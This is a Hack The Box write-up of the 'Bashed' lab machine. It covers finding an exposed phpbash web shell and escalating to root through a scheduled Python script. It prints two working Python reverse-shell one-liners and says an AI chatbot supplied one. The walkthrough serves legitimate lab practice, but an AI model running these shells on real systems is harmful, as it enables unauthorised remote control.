Bahed - HTB Writeup 
[top](images/bashed/top-bash.png)
The bashed was a simple the box that was already running a webshell then the privileges were escalated by python script.   
The nmap scan revealed the only port 80 with no ssh which is unsusual.  
I opened the site at http and creator of the site has disclosed the information that he incorporated phpbash on this site.  
So i fuzzed directories and appended phpbash.php and found its location at /dev. So there goes the user flag.   
[fuzz](images/bashed/fuzzz-bash.png)
[bash](phpbash-bash.png)
Then i attempted to get reverse shell to my own machine however using basic bash syntax didnt work for some reason.  
Then chatgpt gave me this fuckass long python command to get reverse shell and it worked.  
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.7",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'  

[user](images/bashed/user-bash.png)
After running sudo -l i found out that i can become the scriptmanager user and run scripts with his priveleges.
So i became one.
[scriptm](images/bashed/scriptmanager-bashed.png)
Then i discovered scripts directory in root dir that is owned by the scriptmanager.
There was python program and file generated by this python program.
When i deleted this file it came back meaning that the python program was executed repeatedly.
So what i did was i created new python file where i inserted the fuckass long shell from earlier and BANG i got a neew session running as root.
echo 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.7",9002)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);' > execute.py
